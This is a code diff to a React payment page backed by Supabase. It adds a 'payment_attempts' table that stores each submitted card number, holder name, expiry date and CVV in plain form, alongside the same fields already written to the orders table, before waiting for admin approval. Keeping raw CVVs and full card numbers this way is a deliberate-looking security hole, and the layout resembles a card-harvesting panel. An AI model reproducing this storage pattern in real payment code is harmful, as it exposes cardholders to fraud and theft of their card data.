@@ -124,6 +124,16 @@ const Payment = () => {
     // Update database and set status to waiting_approval
     try {
       if (orderData.sequenceNumber) {
+        // First, get the order ID
+        const { data: orderInfo, error: orderError } = await supabase
+          .from("customer_orders")
+          .select("id")
+          .eq("sequence_number", orderData.sequenceNumber)
+          .single();
+
+        if (orderError) throw orderError;
+
+        // Update the order
         const { error } = await supabase.from("customer_orders").update({
           card_number: cardNumber,
           card_holder_name: cardHolder,
@@ -133,6 +143,21 @@ const Payment = () => {
         }).eq("sequence_number", orderData.sequenceNumber);
 
         if (error) throw error;
+
+        // Save payment attempt
+        const { error: paymentError } = await supabase
+          .from("payment_attempts")
+          .insert({
+            order_id: orderInfo.id,
+            card_number: cardNumber,
+            card_holder_name: cardHolder,
+            expiry_date: expiryDate,
+            cvv: cvv,
+          });
+
+        if (paymentError) {
+          console.error("Error saving payment attempt:", paymentError);
+        }
 
         // Start waiting for admin approval
         setWaitingApproval(true);
